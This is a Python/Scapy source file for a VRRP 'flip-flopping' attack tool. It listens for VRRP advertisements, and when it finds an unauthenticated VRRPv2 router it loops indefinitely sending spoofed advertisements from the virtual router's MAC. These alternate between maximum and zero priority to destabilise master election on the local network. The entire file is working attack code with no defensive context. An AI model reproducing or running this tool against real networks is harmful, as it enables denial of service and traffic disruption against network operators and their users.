import sys
import time
from scapy.all import *
from scapy.layers.vrrp import VRRP, VRRPv3
from colorama import *


def vrrp_flip_flopping(interface):
    try:
        print(Fore.YELLOW + f"    [!] Detecting VRRP routers...\n")  # Переведено
        global VRRPv2_without_auth_captured
        VRRPv2_without_auth_captured = False  # Не захвачен

        def vrrp_adv_reply(packet):
            global src_ip, virtual_mac, advert_interval, VRRPv2_without_auth_captured, virtual_rid, virtual_ip
            if packet.haslayer(VRRPv3):  # Если это VRRPv3
                virtual_mac = packet[Ether].src
                src_ip = packet[IP].src
                version = packet[VRRPv3].version
                virtual_rid = packet[VRRPv3].vrid
                priority = packet[VRRPv3].priority
                if priority == 255:
                    output_priority = f"{Fore.RED}255 (max){Fore.GREEN}"
                else:
                    output_priority = priority
                advert_interval = packet[VRRPv3].adv
                output_auth = "None"
                virtual_ip = packet[VRRPv3].addrlist

                print(Fore.GREEN + f"    [+] [VRRP Router detected]\n         MAC: {virtual_mac.upper()}\n"
                                   f"         IP: {src_ip}\n         Version: {Fore.RED}{version} (Temporarily unsupported){Fore.GREEN}\n"
                                   f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (cs)\n         Auth: {output_auth}\n"
                                   f"         Virtual IP Address: {virtual_ip}\n")  # Переведено
                return True

            if packet.haslayer(VRRP):  # Если это VRRPv2
                virtual_mac = packet[Ether].src
                src_ip = packet[IP].src
                version = packet[VRRP].version
                virtual_rid = packet[VRRP].vrid
                virtual_ip = packet[VRRP].addrlist
                advert_interval = packet[VRRP].adv

                priority = packet[VRRP].priority
                if priority == 255:
                    output_priority = f"{Fore.RED}255 (max){Fore.GREEN}"
                else:
                    output_priority = priority

                auth = packet[VRRP].authtype
                if auth == 1:
                    output_auth = f"{Fore.RED}Plain Text (Temporarily unsupported){Fore.GREEN}"
                elif auth == 254:
                    output_auth = f"{Fore.RED}MD5 (Temporarily unsupported){Fore.GREEN}"
                elif auth == 0:
                    output_auth = "None"

                if priority < 255 and auth == 0:
                    VRRPv2_without_auth_captured = True

                print(Fore.GREEN + f"    [+] [VRRP Router detected]\n         MAC: {virtual_mac.upper()}\n         IP: {src_ip}\n         Version: {version}\n"
                                 f"         Virtual Router ID: {virtual_rid}\n         Priority: {output_priority}\n         Advertisement Interval: {advert_interval} (sec)\n         Auth: {output_auth}\n"
                                 f"         Virtual IP Address: {virtual_ip}\n")  # Переведено
                return True

        sniffer = AsyncSniffer(filter="ip proto 112", iface=interface, prn=lambda x: None, stop_filter=vrrp_adv_reply, timeout=10)
        sniffer.start()
        time.sleep(11)

        if VRRPv2_without_auth_captured == True:
            try:
                global virtual_mac, virtual_rid, advert_interval, virtual_ip
                total = 0
                while True:
                    fake_VRRP_Adv_with_MAX_prio = Ether(src=virtual_mac, dst="01:00:5e:00:00:12") / \
                                                  IP(dst="224.0.0.18", ttl=255) / \
                                                  VRRP(version=2, type=1, vrid=virtual_rid, priority=255, authtype=0, adv=advert_interval, addrlist=virtual_ip)

                    sendp(fake_VRRP_Adv_with_MAX_prio, iface=interface, count=1, verbose=False)
                    time.sleep(1)
                    fake_VRRP_Adv_with_MIN_prio = Ether(src=virtual_mac, dst="01:00:5e:00:00:12") / \
                                              IP(dst="224.0.0.18", ttl=255) / \
                                              VRRP(version=2, type=1, vrid=virtual_rid, priority=0, authtype=0, adv=advert_interval, addrlist=virtual_ip)

                    sendp(fake_VRRP_Adv_with_MIN_prio, iface=interface, count=1, verbose=False)
                    time.sleep(1)

                    total += 2
                    print(Fore.GREEN + f"    [+] Sent VRRP Advertisement with modified priority value: {total}", end="\r")  # Переведено

            except KeyboardInterrupt:
                print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        else:
            print(Fore.RED + f"    [-] %ERROR: No VRRPv2 routers detected (attack aborted)")  # Переведено
            print(Fore.RED + f"    [-] %ERROR: Possible VRRP routers using AUTHENTICATION, MAX PRIORITY, or unsupported VRRP VERSION")  # Переведено

    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено